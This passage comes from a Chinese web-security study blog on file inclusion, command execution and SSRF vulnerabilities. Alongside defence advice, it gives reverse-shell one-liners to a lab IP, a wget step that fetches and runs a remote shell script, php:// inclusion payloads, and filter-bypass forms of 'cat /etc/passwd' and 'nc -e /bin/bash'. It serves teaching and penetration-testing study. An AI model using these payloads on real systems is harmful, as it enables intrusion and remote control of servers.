include()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行。</span><br><span class="line">        </span><br><span class="line">    远程包含漏洞前提：如果使用 includer 和 require ，则需要 php.ini 配置如下</span><br><span class="line">    查找文件命令 find &#x2F; -iname 文件名</span><br><span class="line"></span><br><span class="line">    allow_url_fopen &#x3D; on</span><br><span class="line">    allow_url_include &#x3D; on</span><br><span class="line">   </span><br></pre></td></tr></table></figure>



<h3 id="漏洞危害-6"><a href="#漏洞危害-6" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.获取敏感信息</span><br><span class="line">2.任意篡改网页信息</span><br><span class="line">3.攻击其他服务器		</span><br></pre></td></tr></table></figure>



<h3 id="测试方法-4"><a href="#测试方法-4" class="headerlink" title="测试方法"></a>测试方法</h3><h3 id="防御方案-6"><a href="#防御方案-6" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 过滤 .（点）&#x2F;（反斜杠）\（反斜杠）等特殊字符</span><br><span class="line">2. 在功能设计上尽量不要将文件包含函数对应的文件放给前端选择和操作</span><br><span class="line">3. 尽量关闭allow_url_include配置</span><br><span class="line">4. PHP 中使用 open_basedir 配置限制访问在指定的区域</span><br><span class="line">5. 配置 php.ini 配置文件</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line">allow_url_fopen &#x3D; off</span><br><span class="line">allow_url_include &#x3D; off</span><br><span class="line">magic_quotes_gpc &#x3D; on</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line">6. 过白名单策略，仅允许包含运行指定的文件，其他的都禁止</span><br></pre></td></tr></table></figure>



<h3 id="绕过方案"><a href="#绕过方案" class="headerlink" title="绕过方案"></a>绕过方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</span><br><span class="line"></span><br><span class="line">1. url编码绕过</span><br><span class="line">如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</span><br><span class="line"></span><br><span class="line">2. 特殊字符绕过</span><br><span class="line">某些情况下，读文件支持使用Shell通配符，如 ? * 等</span><br><span class="line">url中 使用 ? # 可能会影响include包含的结果</span><br><span class="line">某些情况下，unicode编码不同但是字形相近的字符有同一个效果</span><br><span class="line"></span><br><span class="line">3. %00截断</span><br><span class="line">几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。</span><br><span class="line"></span><br><span class="line">4. 长度截断</span><br><span class="line">Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。</span><br><span class="line"></span><br><span class="line">msdn定义 #define MAX_PATH 260，其中第260个字符为字符串结尾的 \0 ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。</span><br><span class="line"></span><br><span class="line">获取最长文件路径长度：getconf PATH_MAX &#x2F;root 得到4096 获取最长文件名：getconf NAME_MAX &#x2F;root 得到255</span><br><span class="line"></span><br><span class="line">那么在长度有限的时候，.&#x2F;.&#x2F;.&#x2F;.&#x2F; (n个) 的形式就可以通过这个把路径爆掉</span><br><span class="line"></span><br><span class="line">在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</span><br><span class="line"></span><br><span class="line">5. 伪协议绕过</span><br><span class="line">远程包含: 要求 allow_url_fopen&#x3D;On 且 allow_url_include&#x3D;On ， payload为 ?file&#x3D;[http|https|ftp]:&#x2F;&#x2F;websec.wordpress.com&#x2F;shell.txt 的形式</span><br><span class="line">PHP input: 把payload放在POST参数中作为包含的文件，要求 allow_url_include&#x3D;On ，payload为 ?file&#x3D;php:&#x2F;&#x2F;input 的形式</span><br><span class="line">Base64: 使用Base64伪协议读取文件，payload为 ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php 的形式</span><br><span class="line">data: 使用data伪协议读取文件，payload为 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBsb3ZlIFBIUAo&#x3D; 的形式，要求 allow_url_include&#x3D;On</span><br><span class="line"></span><br><span class="line">6. 协议绕过(高级的玩法)</span><br><span class="line">allow_url_fopen 和 allow_url_include 主要是针对 http ftp 两种协议起作用，因此可以使用SMB、WebDav协议等方式来绕过限制。</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/image-20210201194825358.png" alt="image-20210201194825358"></p>
<h3 id="实战案例-5"><a href="#实战案例-5" class="headerlink" title="实战案例"></a>实战案例</h3><h3 id="参考资料-6"><a href="#参考资料-6" class="headerlink" title="参考资料"></a>参考资料</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一句话木马反弹shell</span><br><span class="line"></span><br><span class="line">127.0.0.1 &amp;&amp; php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.200.129&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">127.0.0.1 &amp;&amp; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.200.129&#x2F;1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">在kali机中开启一个监听，在靶机的命令执行漏洞出上传一句话木马，反弹shell之后成功连接靶机</span><br></pre></td></tr></table></figure>

<p><img src="2021-2-25%20%E6%BC%8F%E6%B4%9E%E7%AF%87%20164234.assets/image-20210317094310044.png" alt="image-20210317094310044"></p>
<p><img src="2021-2-25%20%E6%BC%8F%E6%B4%9E%E7%AF%87%20164234.assets/image-20210317094345079.png" alt="image-20210317094345079"></p>
<h3 id="漏洞原理-7"><a href="#漏洞原理-7" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">攻击者通过构造恶意的指令代码输入，而web应用的脚本代码在执行命令时没有经过合法性校验，导致恶意的指令被正确执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">************************** 分为两类： **************************</span><br><span class="line">	1.系统指令执行</span><br><span class="line">		1).在操作系统中，“&amp;、&amp;&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令</span><br><span class="line">		2).调用系统命令的函数的参数可控</span><br><span class="line">		</span><br><span class="line">		当我们需要一次执行多个命令的时候，命令之间需要用连接符连接，不同的连接符有不同的效果。下面我们总结一下，加以区分。</span><br><span class="line">(1)  ; </span><br><span class="line">分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。</span><br><span class="line">(2) ||</span><br><span class="line">逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。</span><br><span class="line">(3) &amp;&amp;</span><br><span class="line">逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</span><br><span class="line">(4) |</span><br><span class="line">管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。</span><br><span class="line">例 ls | grep *.txt</span><br><span class="line">		</span><br><span class="line">	2.代码指令执行</span><br><span class="line">			1).靠执行脚本代码调用操作系统命令</span><br><span class="line">			2).应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等函数，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</span><br><span class="line">	</span><br><span class="line">	区别：命令注入攻击者直接执行系统命令，代码注入是攻击者添加恶意代码，然后由**应用程序执行**</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">************************** 常见的命令执行函数 **************************</span><br><span class="line">PHP：exec、shell_exec、system、passthru、popen、proc_open等</span><br><span class="line">ASP.NET：System.Diagnostics.Start.Process、System.Diagnostics.Start.ProcessStartInfo等</span><br><span class="line">Java：java.lang.runtime.Runtime.getRuntime、java.lang.runtime.Runtime.exec等</span><br></pre></td></tr></table></figure>

<h3 id="利用场景-5"><a href="#利用场景-5" class="headerlink" title="利用场景"></a>利用场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">代码层对输入参数过滤不严</span><br><span class="line">系统漏洞导致命令执行</span><br><span class="line">各种web组件，如容器、框架、cms、安全组件等</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">************************** 利用方式 **************************</span><br><span class="line">存在回显示的话，可以直接读取各种配置文件，密码文件，数据库连接文件等等</span><br><span class="line">遇到不回显的情况，最可靠的方法使用时间延迟推断，类似与盲注的方法。通过一些命令的延时作用来判断漏洞的存在，例如ping命令、sleep函数</span><br><span class="line">不能在浏览器直接看到回显，可将命令重定向到当前目录下的文件中并查看。或者用TFTP上传工具到服务器，用telnet和netcat建立反向shell，用mail通过SMTP发送结果给自己的计算机</span><br><span class="line">查看自己的权限，可以提升自己权限，访问敏感数据或控制服务器。	</span><br><span class="line">		</span><br></pre></td></tr></table></figure>

<h3 id="漏洞危害-7"><a href="#漏洞危害-7" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">执行任意系统命令</span><br><span class="line">继承Web服务器程序的权限，去执行系统命令</span><br><span class="line">继承Web服务器程序的权限，读写文件</span><br><span class="line">反弹shell 控制整个网站 甚至控制整个服务器			</span><br></pre></td></tr></table></figure>

<h3 id="测试方法-5"><a href="#测试方法-5" class="headerlink" title="测试方法"></a>测试方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">************************** 有回显 **************************</span><br><span class="line">1.直接拼接命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">************************** 无回显 **************************</span><br><span class="line">1.延时：</span><br><span class="line">	系统命令注入：ping -c n ip</span><br><span class="line">	代码命令注入：sleep()</span><br><span class="line">2.带外</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">- 不使用命令执行函数。因为大部分情况下框架会提供更安全的 api 来实现所需功能。</span><br><span class="line">   - 如果使用命令执行函数，则强制执行输入验证。</span><br><span class="line">       - 白名单，限制输入类型和长度</span><br><span class="line">       - 黑名单，禁止危险函数</span><br><span class="line">   - 输入的命令尽量使用占位符进行使用，不要直接拼接变量。</span><br><span class="line">   - 尽量不要使用命令执行函数，并且将其（在disable_functions中）禁用。</span><br><span class="line">   - 对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤。</span><br><span class="line">   - 参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</span><br><span class="line">   - 针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。及时更新组件。或者使用自定义函数或函数库来替代外部命令的功能。</span><br><span class="line">   - 使用safe_mode_exec_dir指定可执行文件的路径</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	对于企业来说，任何安全问题的防御需要从多个层面进行，从漏洞的预防-检测-防御。</span><br><span class="line"></span><br><span class="line">       预防：在业务得研发初期就需要安全的介入，在软件的设计，开发，测试，运行环境等等环节进行管控，提前将可能出现的问题扼杀在初期。</span><br><span class="line">       检测：在业务上线后，对生产环节进行周期性检测，做好各类资产管理，安全问题排查，做好风险评估工作，对系统提早发现并修复漏洞。</span><br><span class="line">       防御: 建立完整的漏洞管理方案，漏洞应急响应流程，建立各种防御系统，在漏洞发生的时候有效的拦截。</span><br></pre></td></tr></table></figure>



<h3 id="绕过手段-6"><a href="#绕过手段-6" class="headerlink" title="绕过手段"></a>绕过手段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">- 逻辑运算符绕过</span><br><span class="line"></span><br><span class="line">         - 在 win 下执行 bat 时可以使用 %1a 绕过过滤</span><br><span class="line">           dir&#x3D;..&#x2F; %1a whoami</span><br><span class="line"></span><br><span class="line">         - 如果是 php 环境可以使用 %0a、%0d ，分别表示换行符和回车符</span><br><span class="line"></span><br><span class="line">         - php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。</span><br><span class="line">           漏洞代码如下：</span><br><span class="line">           escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;);</span><br><span class="line">           执行后语句会变成</span><br><span class="line">           echo 繺;id</span><br><span class="line">           从而实现 id 的命令注入</span><br><span class="line"></span><br><span class="line">         - 引号绕过【 c&quot;&quot;at &#x2F;etc&#x2F;passwd、c&quot;&quot;at &#x2F;etc&#x2F;pas&quot;&quot;swd、c&quot;&quot;at &#x2F;etc&#x2F;pas&#39;&#39;swd】</span><br><span class="line"></span><br><span class="line">- 特殊字符绕过：$&#123;IFS&#125; $&#123;IFS&#125;$ $IFS$</span><br><span class="line">                     $&#123;PS2&#125; 对应字符 ‘&gt;’</span><br><span class="line">                     $&#123;PS4&#125; 对应字符 ‘+’</span><br><span class="line">                     $&#123;IFS&#125; 对应 内部字段分隔符</span><br><span class="line">                     $&#123;9&#125; 对应 空字符串</span><br><span class="line"></span><br><span class="line">         whoami &#x2F;&#x2F;正常执行</span><br><span class="line">         w&quot;h&quot;o&quot;a&quot;m&quot;i &#x2F;&#x2F;正常执行</span><br><span class="line">         w&quot;h&quot;o&quot;a&quot;m&quot;i&quot; &#x2F;&#x2F;正常执行</span><br><span class="line">         wh&quot;&quot;o^a^mi &#x2F;&#x2F;正常执行</span><br><span class="line">         wh&quot;&quot;o^am&quot;i &#x2F;&#x2F;正常执行</span><br><span class="line">         ((((Wh^o^am&quot;&quot;i)))) &#x2F;&#x2F;正常执行</span><br><span class="line"></span><br><span class="line">         - 反斜杠绕过【c\at &#x2F;etc&#x2F;pas\swd】</span><br><span class="line"></span><br><span class="line">         - 通配符绕过【 ??? &#x2F; ?? t &#x2F; ??? &#x2F; p ?? s ?? &#x3D;&#x3D;&gt; &#x2F; bin &#x2F; cat &#x2F; etc &#x2F; passwd </span><br><span class="line"></span><br><span class="line">           &#x2F; ??? &#x2F; n？-e &#x2F; ??? &#x2F; b ?? h 2130706433 1337 &#x3D;&#x3D;&gt; nc -e &#x2F; bin &#x2F; bash 127.0.0.1 1337】</span><br><span class="line"></span><br><span class="line">         - 使用数字地址绕过 ip 限制，网络地址有另外一种表示形式，就是数字地址比如127.0.0.1可以转化为2130706433</span><br><span class="line"></span><br><span class="line">         可以直接访问</span><br><span class="line"></span><br><span class="line">         &#96;http:&#x2F;&#x2F;2130706433&#96;或者&#96;http:&#x2F;&#x2F;0x7F000001&#96;</span><br><span class="line"></span><br><span class="line">         [在线转换 ip 地址](http:&#x2F;&#x2F;www.msxindl.com&#x2F;tools&#x2F;ip&#x2F;ip_num.asp）	</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="实战案例-6"><a href="#实战案例-6" class="headerlink" title="实战案例"></a>实战案例</h3><p><img src="2021-2-25%20%E6%BC%8F%E6%B4%9E%E7%AF%87%20164234.assets/image-20210317091615009.png" alt="image-20210317091615009"></p>
<p><img src="2021-2-25%20%E6%BC%8F%E6%B4%9E%E7%AF%87%20164234.assets/image-20210317091914193.png" alt="image-20210317091914193"></p>
<h3 id="参考资料-7"><a href="#参考资料-7" class="headerlink" title="参考资料"></a>参考资料</h3><p>在一个目录下 创建反弹shell 文件 比如 1.sh</p>
<p>然后在同一个目录下开启 web服务</p>
<p> python -m SimpleHTTPServer  9999</p>
<p>在靶机利用命令执行漏洞 远程下载木马文件</p>
<p>system(‘wget <a target="_blank" rel="noopener" href="http://192.168.200.129:9999/1.sh&#39;">http://192.168.200.129:9999/1.sh&#39;</a>);</p>
<p>接着给文件添加可执行权限</p>
<p>最后执行文件</p>
<p><img src="2021-2-25%20%E6%BC%8F%E6%B4%9E%E7%AF%87%20164234.assets/image-20210317112916588.png" alt="image-20210317112916588"></p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="漏洞原理-8"><a href="#漏洞原理-8" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</span><br><span class="line"></span><br><span class="line">将服务器当作跳板去访问内网资源</span><br><span class="line"></span><br><span class="line">SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 file_get_contents() &#x2F; fsockopen() &#x2F; curl_exec() 等。</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/20190520063843_33305.jpg" alt="img"></p>
<h3 id="利用场景-6"><a href="#利用场景-6" class="headerlink" title="利用场景"></a>利用场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line"></span><br><span class="line">2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line"></span><br><span class="line">3.在线翻译：给网址翻译对应网页的内容</span><br><span class="line"></span><br><span class="line">4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line"></span><br><span class="line">5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line"></span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line"></span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line"></span><br><span class="line">8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line"></span><br><span class="line">9.邮件系统：比如接收邮件服务器地址</span><br><span class="line"></span><br><span class="line">10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</span><br><span class="line"></span><br><span class="line">11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</span><br><span class="line"></span><br><span class="line">一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span><br><span class="line"></span><br><span class="line">12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</span><br><span class="line"></span><br><span class="line">13.第三方支付</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">只要从远程服务器请求资源，那么就可能存在漏洞</span><br></pre></td></tr></table></figure>



<h3 id="漏洞危害-8"><a href="#漏洞危害-8" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.内网服务</span><br><span class="line">     邮件服务（imap、pop3、smtp、smtps、imaps、pop3s）、ftp、内网dns、ssh、数据库、svn、git、smb、webdav、金蝶OA、致远OA、jenkins + maven</span><br><span class="line">     </span><br><span class="line">2.redis</span><br><span class="line">     写ssh公钥、写crontab、写webshell、windows写启动项、主从复制加载.so文件、主从复制写无损文件</span><br><span class="line">     </span><br><span class="line">3.云服务器</span><br><span class="line"></span><br><span class="line">SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</span><br></pre></td></tr></table></figure>



<h3 id="测试方法-6"><a href="#测试方法-6" class="headerlink" title="测试方法"></a>测试方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 直接访问内网地址</span><br><span class="line"></span><br><span class="line">2. 可以使用 file、dict、gopher、ftp 协议进行请求访问相应的文件</span><br><span class="line"></span><br><span class="line">3. 攻击内网 web 应用</span><br><span class="line"></span><br><span class="line">4. 检测内网主机是否存活</span><br></pre></td></tr></table></figure>



<h3 id="防御方案-7"><a href="#防御方案-7" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">所有针对ssrf的攻防都是针对check_ssrf这个函数的绕过和更新</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.禁止跳转</span><br><span class="line">   2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span><br><span class="line">   3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题</span><br><span class="line">   4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</span><br><span class="line">   5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</span><br><span class="line">   6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br></pre></td></tr></table></figure>



<h3 id="绕过手段-7"><a href="#绕过手段-7" class="headerlink" title="绕过手段"></a>绕过手段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1.更改IP地址写法</span><br><span class="line"></span><br><span class="line">	对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</span><br><span class="line">        8进制格式：0300.0250.0.1</span><br><span class="line">        16进制格式：0xC0.0xA8.0.1</span><br><span class="line">        10进制整数格式：3232235521</span><br><span class="line">        16进制整数格式：0xC0A80001</span><br><span class="line">        合并后两位：1.1.278 &#x2F; 1.1.755</span><br><span class="line">        合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">2.使用解析到内网的域名：</span><br><span class="line"></span><br><span class="line">	例如：192.168.0.1.xip.io会被解析到192.168.0.1</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">3.利用解析URL所出现的问题</span><br><span class="line"></span><br><span class="line">	比如 http:&#x2F;&#x2F;www.baidu.com@192.168.0.1&#x2F; 